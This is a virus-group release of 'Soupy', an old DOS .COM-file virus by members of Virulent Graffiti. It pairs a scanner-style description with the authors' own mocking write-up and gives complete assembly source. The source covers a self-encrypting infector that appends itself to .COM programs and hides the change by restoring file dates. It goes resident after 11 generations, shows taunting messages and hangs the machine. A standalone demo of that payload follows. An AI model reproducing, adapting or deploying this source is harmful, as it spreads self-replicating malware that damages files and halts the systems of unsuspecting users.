                            ======================
                              Soupy Virus Source
                           By The Attitude Adjuster 
                                     and
                                   AccuPunk
                            ======================

        With the  release  of this  virus marks  the  absolute  end  for all
 boring  direct-action COM  infectors from  Virulent Graffiti... if some pop
 up  in  the  future, bearing  our  name,  and  do not have revolutionary or
 funny activation stages, they are NOT from us...

        Anyway,  I am  at a loss as to why I should use anything but the DOC
 I wrote for this, but,  here's what Patti says, and what I say, you compare
 and contrast who does it better!

 ==========================================================================
 Virus Name:  Soupy
 Aliases:   
 V Status:    New
 Discovered:  January, 1993
 Symptoms:    .COM file growth; TSR; message; system hangs
 Origin:      United States
 Eff Length:  1,072 Bytes
 Type Code:   PRC - Parasitic Resident .COM Infector
 Detection Method:  Novi 1.15a+, CPAV/N
 Removal Instructions:  Delete infected files
 
 General Comments:
       The Soupy virus was submitted in January, 1993, and is from the
       United States.  Soupy is a non-resident, direct action infector
       of .COM programs, but not COMMAND.COM.  In the case of advanced
       infections, it may install a portion of itself memory resident in
       order to facilitate the activation mechanism in the virus.

       When a program infected with the Soupy virus is executed, the
       Soupy virus will infect one .COM file located in the current
       directory, as well as update a counter within the viral code.
       Programs infected with the Soupy virus will have a file length
       increase of 1,072 bytes with the virus being located at the end
       of the file.  The program's date and time in the DOS disk directory
       listing will not be altered.

       The Soupy virus activates once the counter within the viral code
       has reached 11, indicating the 11th generation of the virus has
       been reached.  At this time, the virus will install a portion of
       itself in memory of 736 bytes, hooking interrupt 08.  Once the
       memory resident portion of the virus has been installed, it will
       display the following messages one at a time every three minutes:

               "Unsuspecting user, 12 o'clock!"
               "Get ready... 'cause... THERE'S A VIRUS IN YOUR SOUP!"
               "From the guys that brought you Lythyum, Radyum, and
                VioLite comes:"
               "The Soupy Virus, (k) 1992 VG Enterprises,
                216/513/602/904/703"
               "By The Attitude Adjuster & AccuPunk!"
               "Hurry! Hire an Anti-Virus Professional!
                Increase Wallet Space!"
               "...hmmm, ya' know, I think I''ll halt now..."
     
       Once the last message above is displayed, the system will be
       halted or hung.  The above messages are encrypted within the
       Soupy viral code, as are the following additional text strings:

               "[Soupy] The Attitude Adjuster & AccuPunk,
                VG 08/23/92 to 12/02/92"
               "*.COM"
               "Bad command or file name"
 
 ==========================================================================
 ...and now me...

 ==========================================================================
 Virus Name:  Soupy 
 Aliases:     Virus in Your Soup
 Author:      The Attitude Adjuster & AccuPunk
 Group:       Virulent Graffiti
 Scan ID:         
 V Status:    Frozen to Death
 Discovery:   See, we were in this guy's disk box...
 Symptoms:    .COM files altered; Messages;
 Orgin:       West Bumblefuck, Ohio
 Eff Length:  1073 Bytes
 Res Length:  736 Bytes
 Type Code:   Parasitic Non-Resident .COM Infector
 Detection Method: 
 Removal Instructions:  Delete infected files

 General Comments:

       The Soupy virus is a self-encrypting direct action infector
       of .COM programs. The virus, upon execution, will search the
       current directory for an uninfected .COM program. If none
       are found, the virus will restore the host file and continue
       execution.
 
       The Soupy virus mantains an infection counter. When this counter
       reaches 11, the virus will check for a copy of itself in memory,
       and if not found, make itself the owner of INT 8 and go
       resident.
 
       Approximately every 3 minutes, the virus will display the next
       of 7 messages, finally causing the machine to do a dynamic
       halt on the final message.
 
 ==========================================================================
        And,  just  to get  the story  straight, I  wrote  all the resident
 stuff out  of boredom, and, the  COM engine was what AccuPunk presented as
 his coding example to join the group. I just optomized the code, and added
 my residency, and I was ready to go... 

        This  virus sucks... mainly because I didn't know enough back then,
 but, that has all changed... 
 
 ==========================================================================
;          -] "Oh, waiter [-           A virus to pay tribute to
;         ==]             [==          Anti-Virus Professionals Everywhere!
;          -]   THERE'S   [-
;           ]             [
;          -]      A      [-           Radyum's Little Son
;         ==]             [==
;          -]    VIRUS    [-
;           ]             [            We like Bob Ross, but, we like
;          -]    IN MY    [-           ourselves a lot better.
;         ==]             [==
;          -]   SOUP!!!"  [-
;
;       An original virus by Accu-Punk and The Attitude Adjuster
;       of Virulent Graffiti (216/914/513/602)

;       Greetz: Mom, My Modem, Accu-Punk, The Attitude Adjuster,
;               The Fly, Casper, Chief, Mercury, any other VG Member.

.model tiny
.code                   ; code segment, tiny model -- CS = DS = ES = SS

ComStart        EQU     100h     

     org 100h           ; generate .COM file

entry:
     db 0e9h, 00, 00    ; Jmp decrypt

decrypt:
     mov        si, offset start_code     
     mov        cx, (offset end_code - offset start_code)/2
code_loop:               
     db         81h, 34h, 0, 0                          ; xor word ptr [bx],0 
     lodsw
     loop       code_loop

start_code:                                             ; get delta
     call       get_delta
get_delta:
     pop        bp
     sub        bp, offset get_delta

     xor        ax, ax
     mov        ds, ax

     les        ax, ds:[24h*4]                           ; Load Int 24 Entry
        
     mov        word ptr Cs:[offset I_24+2+bp], es       ; Save it
     mov        word ptr Cs:[offset I_24+bp], ax

     lea        dx, Cs:[offset int_24h_entry+bp]         ; Place new one
     mov        word ptr ds:[24h*4], dx
     mov        word ptr ds:[92h], cs
     
     push       cs
     push       cs
     pop        ds
     pop        es

     cld                                                 ; Restore COM   
     mov        cx, 3
     mov        di, 100h
     lea        si, [bp+first_3]
     rep        movsb

     lea        dx, [bp+newDTA]                          ; Set Up New DTA  
     mov        ah, 1ah
     int        21h

     lea        dx, [bp+com_mask]                        ; Find First *.COM    
     mov        ah, 4eh
find_loop:
     mov        cx, 7
     int        21h
     jc         done_infecting                           ; If Error, Exit  

     mov        ax, 3d00h                                ; Open File for Read  
     lea        dx, [bp+newDTA+1Eh]  
     int        21h                  
     jc         find_next                                ; Find another  

     xchg       ax, bx                                   ; Handle in BX  

     mov        ah, 3fh                                  ; Read File
     mov        cx, 3
     lea        dx, [bp+buffer]
     int        21h

     mov        ah, 3eh
     int        21h

     cmp        word ptr [bp+newDTA+1Eh], 'OC'           ; Command.Com?
     je         find_next

     cmp        word ptr [bp+newDTA+1Ah], (65535-(heap_end - start_code))
     ja         find_next                                ; too big

     cmp        word ptr [bp+newDTA+1Ah], 300h
     jb         find_next                                ; too little bitty
     
     mov        ax, word ptr [bp+newDTA+1Ah]
     push       ax
     sub        ax, (end_code - decrypt) + 3             ; correct JMP
     cmp        ax, word ptr [bp+buffer+1]
     je         find_next                                ; not to end!
     jmp        infect
     
find_next:
     mov        ah, 4fh
     jmp        find_loop 

done_infecting:
     mov        ah, 1ah
     mov        dx, 0080h
     int        21h                                      ; set up old DTA

     pop        ax

     xor        ax,ax
     push       ax
     pop        ds
     les        ax, ds:[08h*4]
     push       cs
     pop        ds

     mov        word ptr [Old08+Bp], Ax
     mov        word ptr [Old08+2+Bp], Es
     add        ax, ((GetOut-1)-Int_08_Handler)
     mov        bx, ax
     cmp        word ptr Es:[Bx], 0EA58h
     je         quit
     push       cs
     pop        es
     
     cmp        byte ptr [Counter+Bp], 0ah
     jle        quit
     
     lea        Si, [Offset Int_08_Handler+Bp]           ; copy us
     mov        Di, 0100h
     mov        Cx, Offset End_Handler-Offset Int_08_Handler
     rep        MovSb
        
     xor        ax, ax                                   ; interrupt table
     mov        ds, ax
     cli
     mov        ax, 100h
     mov        word ptr Ds:[08h*4], ax
     mov        word ptr Ds:[08h*4+2], cs
     sti
     
     push       cs
     pop        ds
     push       cs

     mov        ah, 49h                                  ; Deallocate Env.
     mov        bx, word ptr cs:[02ch]
     mov        es, bx
     int        21h
     pop        es

     Mov        ah, 9
     Lea        dx, [Offset Bullshit+Bp]
     Int        21h
     
     Mov        Ax, 3100h
     mov        Dx, (((Offset End_Handler-Offset Int_08_Handler)+100h) / 16) + 1
     Int        21h     
     Int        20h     
  
Quit:     
     xor        ax, ax
     mov        ds, ax

     mov        bx, word ptr Cs:[offset I_24+bp]
     mov        es, word ptr Cs:[offset I_24+2+bp]

     mov        word ptr ds:[24h*4], bx                  ; Restore int 24h
     mov        word ptr ds:[24h*4+2], es

     push       cs
     push       cs
     pop        ds
     pop        es

     mov        dx, 100h                                 ; We Are Done!
     jmp        dx

infect:
     cld
     lea        si, [bp+buffer]          
     lea        di, [bp+first_3]
     push       si
     mov        cx, 3
     rep        movsb                    ; save original first three bytes 
     pop        di                       ; now we write to the buffer...
     mov        al, 0e9h                 ; change first three bytes of target file
     stosb                               ; to jump to the end, which will be the
     pop        ax                       ; first byte of the viral code.
     sub        ax, 3                    ; correct for the jump opcode size
     stosw                               ; and put the displacement at [DI].

     xor        cx, cx
     lea        dx, [bp+newDTA+1Eh]
     mov        ax, 4301h                ; set attributes to nothing
     int        21h

     mov        ah, 3dh
     mov        al, 2                    ; read/write
     int        21h
     xchg       ax,bx               ; ok, we're gonna be boring and use XCHG

     mov        ah, 40h             ; bx = filehandle
     mov        cx, 3
     lea        dx, [bp+buffer]
     int        21h                      ; write 3 bytes at buffer to file
                   
     mov        ax, 4202h                ; LSEEK from end of file
     xor        cx, cx                   ; seek 0 bytes from end
     xor        dx, dx                   ; set up for copying the virus
     int        21h

     push       bx
get_new_code:                      ; get new encryption word
     mov        bx, 40h 
     mov        es, bx
     mov        bx, 6Ch
     mov        dx, word ptr es:[bx]     ; dx = encryption_word
     or         dx, dx                   ; dx == 0? (no effect)
     jz         get_new_code             ; nah, get a new one
     mov        word ptr [bp+code_loop+2], dx         
     pop        bx
     push       cs
     pop        es

copy_code:
     cld
     push       ax

     lea        di, [bp+temp]
     mov        al, 53h                       ; push bx
     stosb
     
     lea        si, [bp+decrypt]
     mov        cx, start_code-decrypt        ; copy the code unaltered first
     push       si
     push       cx                       
     rep        movsb                         ; copy decrypt
     lea        si, [bp+write]            
     mov        cx, end_write-write
     rep        movsb                         ; copy write
     pop        cx
     pop        si
     rep        movsb                         ; copy decrypt again
     mov        ax, 0C35Bh                    ; POP BX, retn
     stosw
     pop        ax                            ; ax = filesize

patch_bx_offset:
     mov        dx, word ptr [bp+decrypt+1]   ; dx = offset start_code rel 100h
     sub        dx, bp
     sub        dx, 3
     add        dx, ax                        ; add filesize to offset
     mov        word ptr [bp+decrypt+1], dx   ; patch it

     inc        byte ptr [bp+counter]
     call       temp

finish_infection:
     mov        ax, 5701h
     mov        cx, word ptr [bp+newDTA+16h]  ; cx = file time
     mov        dx, word ptr [bp+newDTA+18h]  ; dx = file date
     int        21h
     xor        cx, cx
     mov        ax, 4301h
     mov        cl, byte ptr [bp+newDTA+15h]  ; cl = attributes
     lea        dx, [bp+newDTA+1Eh]
     int        21h

     mov        ah, 3eh
     int        21h
     jmp        done_infecting

write:                   
     pop        bx
     mov        ah, 40h
     mov        cx, end_code - decrypt
     lea        dx, [bp+decrypt]
     int        21h
     push       bx
end_write:

Int_24h_Entry   Proc    Far
        Mov     Ax, 3                                   ; Process Terminate
        Iret                                            ; Do a LOT, Eh?
        EndP

Int_08_Handler  Proc    Far
        Push    Ax
        Push    Bx
        Push    Cx
        Push    Dx
        Push    Si
        Push    Di
        Push    Bp
        Push    Es
        Push    Ds

        Dec     Word Ptr Cs:[TCounter]
        Jz      Do_It

LeaveRite:        
        Pop     Ds
        Pop     Es
        Pop     Bp
        Pop     Di
        Pop     Si
        Pop     Dx
        Pop     Cx
        Pop     Bx
        Pop     Ax

GetOut:        
         Db      0eah    ; JMP Far PTR
Old08    Dd      ?

_Iet     Db      1
_Counter Dw      1092

Do_It:
        Push    Cs
        Push    Cs
        Pop     Es
        Pop     Ds

        Mov     Word Ptr Cs:[TCounter], 1092

        Mov     Si, Start_Chain
        Xor     Cx, Cx
        Mov     Cl, Byte Ptr Cs:[Iet]
        Xor     Ax, Ax
Chain_Loop:
        LodSb
        Add     Si, Ax
        Loop    Chain_Loop

        LodSb
        Xor     Cx, Cx
        Mov     Cl, Al
        
        XChg    Bp, Si        
        Mov     Ah, 0fh
        Int     10h

        Mov     Ax, 1300h
        Mov     Bx, 000Fh
        Xor     Dx, Dx
        Int     10h
        Inc     Byte Ptr Cs:[Iet]
        Mov     Cx, 50
C2:
        Push    Cx
        Mov     Cx, 0ffffh
RP:
        Loop    RP
        Pop     Cx
        Loop    C2
        
        Cmp     Byte Ptr Cs:[Iet], 8
        Je      Quonto
        Jmp     LeaveRite
Quonto:
        Cli                
        Jmp     $
        EndP

_Start_Chain:
db 0
db 30, 'Unsuspecting user, 12 o''clock!'
db 52, 'Get ready... ''cause... THERE''S A VIRUS IN YOUR SOUP!'
db 66, 'From the guys that brought you Lythyum, Radyum, and VioLite comes:'
db 61, 'The Soupy Virus, (k) 1992 VG Enterprises, 216/513/602/914/703'
db 36, 'By The Attitude Adjuster & AccuPunk!'
db 62, 'Hurry! Hire an Anti-Virus Professional! Increase Wallet Space!'
db 43, '...hmmm, ya'' know, I think I''ll halt now...'

_End_Chain:   
Start_Chain     = (_Start_Chain - Int_08_Handler) + 100h
End_Chain       = (_End_Chain - Int_08_Handler) + 100h
Iet             = (_Iet  - Int_08_Handler) + 100h
TCounter        = (_Counter - Int_08_Handler) +100h
End_Handler:

; DATA SPACE

name_date db   00,'[Soupy]  The Attitude Adjuster & AccuPunk, VG',00
          db   '08/23/92 to 12/02/92',00
first_3   db   0CDh, 20h, 90h      ; put return to dos opcodes at 100h
com_mask  db   '*.COM',0
counter   db   0
BullShit  db   'Bad command or file name',0dh,0ah,'$'
end_code = $   ; end of encryption and writing...

buffer    db   3 dup (?)
newDTA    db   50 dup (?)
I_24      dd   ?
temp:     db   ((start_code - decrypt)*2 + (end_write-write) + 5) dup (?)

heap_end = $   ; marks end of heap
        
        end  entry
 ==========================================================================
; Very shitty and hurredly written stand alone demonstration for the Soupy
; virus, By The Attitude Adjuster.

; Assemble with:
;  tasm sbomb /m2
;  tlink sbomb /t

;  Wait for the messages! No delays have been removed!

.model tiny
.code

     org 100h
entry:
     mov        ax, 3508h
     int        21h

     mov        word ptr [Old08], Bx
     mov        word ptr [Old08+2], Es
     add        ax, ((GetOut-1)-Int_08_Handler)
     mov        bx, ax
     cmp        word ptr Es:[Bx], 0EA58h
     je         quit
     push       cs
     pop        es
     
     mov        dx, offset Int_08_Handler
     mov        ax, 2508h
     int        21h
     
     Mov        ah, 9
     Lea        dx, [Offset Bullshit+Bp]
     Int        21h
     
     mov        Dx, Offset Heap_End
     Int        27h     
Quit:     
     Int        20h     

Int_08_Handler  Proc    Far
        Push    Ax
        Push    Bx
        Push    Cx
        Push    Dx
        Push    Si
        Push    Di
        Push    Bp
        Push    Es
        Push    Ds

        Dec     Word Ptr Cs:[Counter]
        Jz      Do_It

LeaveRite:        
        Pop     Ds
        Pop     Es
        Pop     Bp
        Pop     Di
        Pop     Si
        Pop     Dx
        Pop     Cx
        Pop     Bx
        Pop     Ax

GetOut:        
         Db      0eah    ; JMP Far PTR
Old08    Dd      ?

Iet     Db      1
Counter Dw      1092

Do_It:
        Push    Cs
        Push    Cs
        Pop     Es
        Pop     Ds

        Mov     Word Ptr Cs:[Counter], 1092

        Mov     Si, Offset Start_Chain
        Xor     Cx, Cx
        Mov     Cl, Byte Ptr Cs:[Iet]
        Xor     Ax, Ax
Chain_Loop:
        LodSb
        Add     Si, Ax
        Loop    Chain_Loop

        LodSb
        Xor     Cx, Cx
        Mov     Cl, Al
        
        XChg    Bp, Si        
        Mov     Ah, 0fh
        Int     10h

        Mov     Ax, 1300h
        Mov     Bx, 000Fh
        Xor     Dx, Dx
        Int     10h
        Inc     Byte Ptr Cs:[Iet]
        Mov     Cx, 50
C2:
        Push    Cx
        Mov     Cx, 0ffffh
RP:
        Loop    RP
        Pop     Cx
        Loop    C2
        
        Cmp     Byte Ptr Cs:[Iet], 8
        Je      Quonto
        Jmp     LeaveRite
Quonto:
        Cli                
        Jmp     $
        EndP

Start_Chain:
db 0
db 30, 'Unsuspecting user, 12 o''clock!'
db 52, 'Get ready... ''cause... THERE''S A VIRUS IN YOUR SOUP!'
db 66, 'From the guys that brought you Lythyum, Radyum, and VioLite comes:'
db 61, 'The Soupy Virus, (k) 1992 VG Enterprises, 216/513/602/914/703'
db 36, 'By The Attitude Adjuster & AccuPunk!'
db 62, 'Hurry! Hire an Anti-Virus Professional! Increase Wallet Space!'
db 43, '...hmmm, ya'' know, I think I''ll halt now...'
End_Chain:   
End_Handler:

BullShit  db   'Bad command or file name',0dh,0ah,'$'
end_code = $   ; end of encryption and writing...

heap_end = $   ; marks end of heap
        
        end  entry
 ==========================================================================
